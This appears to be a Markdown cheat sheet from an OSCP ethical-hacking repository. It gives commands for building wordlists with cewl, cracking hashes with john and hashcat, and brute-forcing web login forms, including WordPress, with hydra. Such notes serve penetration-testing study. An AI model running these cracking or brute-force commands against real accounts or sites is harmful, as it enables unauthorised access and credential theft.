### :panda_face: [Wordlists](https://github.com/D4nk0St0rM/oscp_ethical_hacking/tree/main/wordlists)

Generate a custom wordlist
```
cewl -w createWordlist.txt -m <min password length> https://www.example.com
```
### :panda_face: Hashes

https://hashes.org/search.php

john the ripper
```
john --wordlist=/user/share/wordlists/rockyou.txt hash.txt
```


- [Hashcat 1](https://github.com/D4nk0St0rM/oscp_ethical_hacking/blob/main/tools/hashcat.md)
- [Hashcat 2](https://github.com/D4nk0St0rM/oscp_ethical_hacking/blob/main/666_Hashcat.md)
```
hashcat -m\<type> -a 0 /usr/share/wordlists/rockyou.txt hash.txt
```

### :panda_face: Web

[Hydra](https://github.com/D4nk0St0rM/oscp_ethical_hacking/blob/main/666_Hydra.md)
[Hydra pdf](https://github.com/D4nk0St0rM/oscp_ethical_hacking/blob/main/tools/Hydra-Password-Cracking-Cheatsheet.pdf)

HTTP post form
```
hydra -L <wordlist> -P<password list> <IP> http-post-form "<file path>:username=^USER^&password=^PASS^&Login=Login:<fail message>"
```

Wordpress
```
hydra -l admin  -P /opt/seclists/Passwords/probable-v2-top1575.txt  TARGET -V http-form-post '/wp/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

```


